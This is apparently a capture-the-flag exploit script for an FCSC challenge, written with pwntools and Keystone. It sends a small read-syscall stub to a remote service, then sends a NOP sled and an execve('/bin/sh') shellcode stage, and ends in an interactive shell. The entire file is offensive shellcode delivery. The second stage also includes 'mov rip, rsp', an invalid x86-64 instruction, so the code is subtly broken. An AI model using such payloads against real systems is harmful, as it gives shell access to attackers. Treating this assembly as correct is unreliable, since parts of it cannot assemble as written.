import sys

from pwn import *
from keystone import *
from capstone import *

from ae64 import AE64

context.log_level = "debug"

# Display results
# print(f"[+] length: {len(shellcode)}   unique bytes: {len(set(shellcode))}")
# print(f"[+] CODE: {CODE}")
# print(f"[+] Hex: {' '.join(f'{b:02x}' for b in shellcode)}")

# Initialize Keystone with x86_64 mode
ks = Ks(KS_ARCH_X86, KS_MODE_64)
# Connect to remote
io = remote("chall.fcsc.fr", 2102)
# io = process("bigorneau.py")

# STAGE 1
# send read shellcode
CODE = """
    xor rsi, rsp
    mov dl, 0xb2
    syscall
"""

encoding, count = ks.asm(CODE)
io.recvuntil(b"128 bytes):\n")
io.sendline(bytes(encoding).hex())
# sys.stdout.buffer.write(bytes(encoding))

sleep(2)
# STAGE 2
# send execve shellcode
CODE = """
    mov rip, rsp
    mov rax, 0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    xor eax, eax
    push rax
    mov al, 59
    push rsp
    pop rdx
    push rsp
    pop rsi
    syscall
"""
encoding, count = ks.asm(CODE)
io.send(b'\x90'*0x60 + bytes(encoding))
# sys.stdout.buffer.write(bytes(encoding))
io.interactive()